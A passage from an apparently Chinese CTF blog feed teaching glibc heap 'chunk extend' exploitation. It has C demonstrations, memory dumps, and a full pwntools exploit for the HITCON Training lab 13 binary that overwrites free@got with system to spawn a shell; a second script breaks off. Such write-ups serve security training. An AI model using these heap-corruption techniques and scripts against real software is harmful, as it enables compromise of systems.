class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(<span class="hljs-number">127</span>))<span class="hljs-comment">#gdb.attach(p)</span>p.interactive()</code></pre><h2 id="pwn3">pwn3<a class="post-anchor" href="#pwn3"></a></h2><p>利用 malloc_consolidate 去完成 chunk 的重叠，从而实现leak libc跟 tcache 的uaf（通过刻意的让 unsorted chunk 的size变小，可以让 unsorted chunk 的下一个chunk的prev_size 不变，从而可以 pass malloc_consolidate 时的 unlink 检测，从而实现chunk的重</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunk extend</title>
      <link href="/2019/10/21/chunk-extend/"/>
      <url>/2019/10/21/chunk-extend/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍">介绍<a class="post-anchor" href="#介绍"></a></h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件</p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理">原理<a class="post-anchor" href="#原理"></a></h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在堆 chunk 进行操作时使用的各种宏。</p><p>在 ptmalloc 中，获取 chunk 块大小操作如下</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></code></pre><p>一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。</p><p>在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></code></pre><p>即使用当前块指针加上当前块大小。</p><p>在 ptmalloc 中，获取前一个chunk 信息的操作如下</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></code></pre><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。</p><p>在 ptmalloc，判断当前 chunk 是否 use 状态的操作如下：</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</code></pre><p>即查看下一个 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前chunk size 计算得出</p><p>通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 prev_size 域来实现跨越块操作从而导致 overlapping的。</p><p>与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。</p><h2 id="基本示例1：对-inuse-的fastbin-进行extend">基本示例1：对 inuse 的fastbin 进行extend<a class="post-anchor" href="#基本示例1：对-inuse-的fastbin-进行extend"></a></h2><p>简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。<strong>注意，我们的示例都是在 64 位的程序。如果想在32位下进行测试，可以把 8 字节偏移改为 4 字节。</strong></p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第一个0x10的chunk</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk</span>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x41</span>;<span class="hljs-comment">// 修改第一个块的size域</span>    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>);<span class="hljs-comment">// 实现 extend，控制了第二个块的内容</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>当两个 malloc 语句执行之后，堆的内存分布如下</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <span class="hljs-number">1</span><span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span> &lt;=== chunk <span class="hljs-number">2</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fc1</span> &lt;=== top chunk</code></pre><p>之后，我们会把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40.在题目中这一步可以由堆溢出得到。</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== 篡改大小<span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000021</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020fc1</span></code></pre><p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。</p><pre><code class="hljs assembly">Fastbins[idx=0, size=0x10] 0x00Fastbins[idx=1, size=0x20] 0x00Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE)Fastbins[idx=3, size=0x40] 0x00Fastbins[idx=4, size=0x50] 0x00Fastbins[idx=5, size=0x60] 0x00Fastbins[idx=6, size=0x70] 0x00</code></pre><p>之后我们通过 malloc(0x30) 得到 chunk1 + chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p><pre><code class="hljs assembly">call   0x400450 &lt;malloc@plt&gt;mov    QWORD PTR [rbp-0x8], raxrax = 0x602010</code></pre><h2 id="基本示例2：对-inuse-的-smallbin-进行-extend">基本示例2：对 inuse 的 smallbin 进行 extend<a class="post-anchor" href="#基本示例2：对-inuse-的-smallbin-进行-extend"></a></h2><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被植入 fastbin 链表中。以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用的范围是 0x70）</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个 0x80 的chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第二个 0x10 的chunk2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//防止与top chunk合并</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);&#125;</code></pre><p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个chunk ，把释放的块与 top chunk 隔开。</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;===chunk1 篡改size域0x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000000021 &lt;=== 防止合并的chunk0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</code></pre><p>释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x00000000000000b1 &lt;=== 被放入unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x00000000000000210x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x00000000000000b0  0x0000000000000020 &lt;=== 注意此处标记为空0x6020c0:   0x0000000000000000  0x00000000000000000x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk</code></pre><pre><code class="hljs assembly">[+] unsorted_bins[0]: fw=0x602000, bk=0x602000 →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)</code></pre><p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p><pre><code class="hljs assembly">    0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;→   0x4005b5 &lt;main+79&gt;        mov    QWORD PTR [rbp-0x8], rax    rax : 0x0000000000602010</code></pre><h2 id="基本示例3：对-free-的-smallbin-进行-extend">基本示例3：对 free 的 smallbin 进行 extend<a class="post-anchor" href="#基本示例3：对-free-的-smallbin-进行-extend"></a></h2><p>示例3 是在示例2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 size 域。</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span>    <span class="hljs-built_in">free</span>(ptr);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);&#125;</code></pre><p>两次 malloc 之后的结果如下</p><pre><code class="hljs assembly">0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 10x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51</code></pre><p>我们首先释放 chunk1 使他进入 unsorted bin 中</p><pre><code class="hljs assembly">     unsorted_bins[0]: fw=0x602000, bk=0x602000 →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== 进入unsorted bin0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b780x602020:   0x0000000000000000  0x00000000000000000x602030:   0x0000000000000000  0x00000000000000000x602040:   0x0000000000000000  0x00000000000000000x602050:   0x0000000000000000  0x00000000000000000x602060:   0x0000000000000000  0x00000000000000000x602070:   0x0000000000000000  0x00000000000000000x602080:   0x0000000000000000  0x00000000000000000x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 20x6020a0:   0x0000000000000000  0x00000000000000000x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk</code></pre><p>然后 篡改 chunk1 的 size 域</p><pre><code class="hljs cpp"><span class="hljs-number">0x602000</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x00000000000000b1</span> &lt;=== size域被篡改<span class="hljs-number">0x602010</span>:   <span class="hljs-number">0x00007ffff7dd1b78</span>  <span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x602020</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602030</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602040</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602050</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000000090</span>  <span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f51</span></code></pre><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h2 id="Chunk-Extend-Shrink-可以做什么">Chunk Extend/Shrink 可以做什么<a class="post-anchor" href="#Chunk-Extend-Shrink-可以做什么"></a></h2><p> 一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄露和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping ，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="基本示例4：通过-extend-后向-overlapping">基本示例4：通过 extend 后向 overlapping<a class="post-anchor" href="#基本示例4：通过-extend-后向-overlapping"></a></h2><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其他的一些利用。</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr,*ptr1;    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第1个 0x80 的chunk1</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第2个 0x10 的chunk2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第3个 0x10 的chunk3</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第4个 0x10 的chunk4    </span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;    <span class="hljs-built_in">free</span>(ptr);    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);&#125;</code></pre><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h2 id="基本示例5：通过extend-前向-overlapping">基本示例5：通过extend 前向 overlapping<a class="post-anchor" href="#基本示例5：通过extend-前向-overlapping"></a></h2><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块。</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;    <span class="hljs-keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin1</span>    ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin1</span>    ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//fastbin2</span>    ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<span class="hljs-comment">//smallbin2</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//防止与top合并</span>    <span class="hljs-built_in">free</span>(ptr1);    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x90</span>;<span class="hljs-comment">//修改pre_inuse域</span>    *(<span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)ptr4<span class="hljs-number">-0x10</span>)=<span class="hljs-number">0xd0</span>;<span class="hljs-comment">//修改pre_size域</span>    <span class="hljs-built_in">free</span>(ptr4);<span class="hljs-comment">//unlink进行前向extend</span>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x150</span>);<span class="hljs-comment">//占位块</span>&#125;</code></pre><p>前向 extend 利用了 small bin 的 unlink 机制，通过修改 pre_size 域可以跨越多个chunk 进行合并实现 overlapping。</p><h2 id="HITCON-Training-lab-13">HITCON Training lab 13<a class="post-anchor" href="#HITCON-Training-lab-13"></a></h2><p>程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。</p><p><strong>程序逻辑</strong></p><pre><code class="hljs bash">--------------------------------          Heap Creator          -------------------------------- 1. Create a Heap                2. Edit a Heap                  3. Show a Heap                  4. Delete a Heap                5. Exit                        --------------------------------</code></pre><p><strong>创建堆</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">create_heap</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span>  <span class="hljs-keyword">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )  &#123;    <span class="hljs-keyword">if</span> ( !heaparray[i] )    &#123;      heaparray[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-keyword">if</span> ( !heaparray[i] )      &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);      &#125;      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);      read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);      size = atoi(&amp;buf);      v0 = heaparray[i];      v0[<span class="hljs-number">1</span>] = <span class="hljs-built_in">malloc</span>(size);      <span class="hljs-keyword">if</span> ( !*((_QWORD *)heaparray[i] + <span class="hljs-number">1</span>) )      &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);      &#125;      *(_QWORD *)heaparray[i] = size;      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>, &amp;buf);      read_input(*((_QWORD *)heaparray[i] + <span class="hljs-number">1</span>), size);      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;    &#125;  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v5;&#125;</code></pre><p><strong>编辑堆，比之前创建堆时的size多读入了一个字节，造成 off-by-one</strong></p><pre><code class="hljs cpp"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">edit_heap</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">4u</span>LL);  v1 = atoi(&amp;buf);  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt; <span class="hljs-number">9</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);    _exit(<span class="hljs-number">0</span>);  &#125;  <span class="hljs-keyword">if</span> ( heaparray[v1] )  &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>, &amp;buf);    read_input(*((_QWORD *)heaparray[v1] + <span class="hljs-number">1</span>), *(_QWORD *)heaparray[v1] + <span class="hljs-number">1L</span>L);    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre><h3 id="基本功能">基本功能<a class="post-anchor" href="#基本功能"></a></h3><p>程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下</p><ol><li>创建堆，根据用户输入的长度，申请对应内存空间，并利用read 读取指定长度内容。这里长度没有进行检测，当长度为负数的时候，会出现任意长度堆溢出的漏洞。当前，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li><li>编辑堆，根据指定的索引以及之前存储的堆的大小读取内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 漏洞。</li><li>展示堆，输出指定索引堆的大小以及内容。</li><li>删除堆，删除指定堆，并且将对应指针设置为了NULL。</li></ol><h2 id="利用">利用<a class="post-anchor" href="#利用"></a></h2><p>基本利用思路如下</p><ol><li>利用 off by one 漏洞覆盖下一个chunk 的size 字段，从而构造伪造的chunk 大小。</li><li>申请伪造的chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><p>exp</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># -*- coding: utf-8 -*-</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *r = process(<span class="hljs-string">'./heapcreator'</span>)heap = ELF(<span class="hljs-string">'./heapcreator'</span>)libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size, content)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"1"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(size))    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx, content)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"2"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"3"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(<span class="hljs-string">"4"</span>)    r.recvuntil(<span class="hljs-string">":"</span>)    r.sendline(str(idx))free_got = <span class="hljs-number">0x602018</span>create(<span class="hljs-number">0x18</span>, <span class="hljs-string">"dada"</span>)  <span class="hljs-comment"># 0</span>create(<span class="hljs-number">0x10</span>, <span class="hljs-string">"ddaa"</span>)  <span class="hljs-comment"># 1</span><span class="hljs-comment"># overwrite heap 1's struct's size to 0x41</span>edit(<span class="hljs-number">0</span>, <span class="hljs-string">"/bin/sh\x00"</span> + <span class="hljs-string">"a"</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">"\x41"</span>)<span class="hljs-comment"># trigger heap 1's struct to fastbin 0x40</span><span class="hljs-comment"># heap 1's content to fastbin 0x20</span>delete(<span class="hljs-number">1</span>)<span class="hljs-comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span><span class="hljs-comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span><span class="hljs-comment"># that is to say we can overwrite new heap 1's struct</span><span class="hljs-comment"># here we overwrite its heap content pointer to free@got</span>create(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x30</span>) + p64(heap.got[<span class="hljs-string">'free'</span>]))  <span class="hljs-comment">#1</span><span class="hljs-comment"># leak freeaddr</span>show(<span class="hljs-number">1</span>)r.recvuntil(<span class="hljs-string">"Content : "</span>)data = r.recvuntil(<span class="hljs-string">"Done !"</span>)free_addr = u64(data.split(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))libc_base = free_addr - libc.symbols[<span class="hljs-string">'free'</span>]log.success(<span class="hljs-string">'libc base addr: '</span> + hex(libc_base))system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]<span class="hljs-comment">#gdb.attach(r)</span><span class="hljs-comment"># overwrite free@got with system addr</span>edit(<span class="hljs-number">1</span>, p64(system_addr))<span class="hljs-comment"># trigger system("/bin/sh")</span>delete(<span class="hljs-number">0</span>)r.interactive()</code></pre><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh=process(<span class="hljs-string">'./heapcreator'</span>)elf=ELF(<span class="hljs-string">'./heapcreator'</span>)libc=ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,value)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'1'</span>)    sh.recvuntil(<span class="hljs-string">'Size of Heap :'</span>)    sh.sendline(str(size))    sh.recvuntil(<span class="hljs-string">'Content of heap:'</span>)    sh.sendline(value)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,value)</span>:</span>    sh.recvuntil(<span class="hljs-string">'Your choice :'</span>)    sh.sendline(<span class="hljs-string">'2'</span>)    sh.recvuntil(<span class="hljs-string">'Index :'</span>)    sh.sendline(str(idx))    sh.recvuntil(<span class="hljs-string">'Content of heap : '</span>)    sh.sendline(value)<span 